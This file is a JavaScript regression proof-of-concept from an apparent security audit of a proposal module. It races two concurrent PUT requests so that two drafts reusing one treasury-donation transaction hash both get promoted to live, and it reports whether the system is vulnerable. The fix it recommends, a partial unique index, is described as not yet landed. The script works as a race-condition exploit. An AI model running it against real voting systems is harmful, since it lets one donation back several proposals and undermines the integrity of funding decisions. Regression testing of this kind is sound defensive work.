/**
 * TX-HASH-001 (regression) — treasury-donation hash promote race (CRITICAL)
 *
 * Filed 2026-04-21 as ekklesia-proposal-module#418. The recommended fix
 * (partial unique index on (voteId, metaData.treasuryDonationTxHash) with
 * partialFilterExpression status NOT IN draft/archived) was not landed on
 * v2 — see schema/Proposal.js, no such index. The TOCTOU between
 * validateProposalTreasuryTxHash and proposal.save() is still open.
 *
 * Prereqs (env vars):
 *   API     - http://localhost:3001
 *   COOKIE  - auth cookie for a proposer whose stake matches a known
 *             preprod treasury-donation tx
 *   VOTE_ID - ObjectId of a budget2026 vote in submission window
 *   TX_HASH - real preprod tx hash whose donor stake = the proposer
 *   DRAFT_A, DRAFT_B - ObjectIds of two draft proposals on VOTE_ID by
 *                     the same proposer, both with TX_HASH in
 *                     metaData.treasuryDonationTxHash.
 *
 * Pass criteria mirrors atk-cc-cold-promote-race.js.
 */
const API = process.env.API ?? "http://localhost:3001";
const COOKIE = process.env.COOKIE ?? "";
const VOTE_ID = process.env.VOTE_ID ?? "";
const TX_HASH = process.env.TX_HASH ?? "";
const DRAFT_A = process.env.DRAFT_A ?? "";
const DRAFT_B = process.env.DRAFT_B ?? "";

if (!COOKIE || !VOTE_ID || !TX_HASH || !DRAFT_A || !DRAFT_B) {
  console.error("Set COOKIE, VOTE_ID, TX_HASH, DRAFT_A, DRAFT_B env vars");
  process.exit(2);
}

function promoteBody() {
  return {
    voteId: VOTE_ID,
    status: "live",
    title: `[Wraith-2026-05-06-V2] tx-hash regression`,
    summary: "treasury hash race regression PoC",
    metaData: {
      treasuryDonationTxHash: TX_HASH,
    },
  };
}

async function promote(proposalId) {
  const t0 = Date.now();
  const res = await fetch(`${API}/api/v0/proposals/${proposalId}`, {
    method: "PUT",
    headers: { "Content-Type": "application/json", Cookie: COOKIE },
    body: JSON.stringify(promoteBody()),
  });
  const body = await res.text();
  return { id: proposalId, status: res.status, ms: Date.now() - t0, body };
}

const [a, b] = await Promise.all([promote(DRAFT_A), promote(DRAFT_B)]);
console.log(JSON.stringify({ a, b }, null, 2));

const both200 = a.status === 200 && b.status === 200;
console.log(both200 ? "VULNERABLE: both promotes succeeded" : "Mitigated or partial");
process.exit(both200 ? 0 : 1);
